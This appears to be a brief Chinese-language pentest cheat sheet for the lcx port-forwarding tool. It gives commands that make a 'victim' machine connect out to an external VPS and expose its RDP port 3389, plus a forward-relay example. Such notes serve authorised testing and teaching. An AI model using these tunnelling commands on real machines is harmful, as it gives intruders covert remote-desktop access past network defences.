#### lcx

| 方式 |                             命令                             |
| :--: | :----------------------------------------------------------: |
| 反向(外部vps) | `外部VPS：lcx.exe -listen 1111 2222`|
| 反向(受害者)|`受害者：lcx.exe -slave VPSip 1111 127.0.0.1 3389`|
|反向(使用方法)|访问本地2222端口即访问受害者3389端口|
| 正向 | `lcx.exe -tran 1111 2.2.2.2 8080`|
|正向(使用方法)|访问本地1111端口就是2.2.2.2的8080端口|
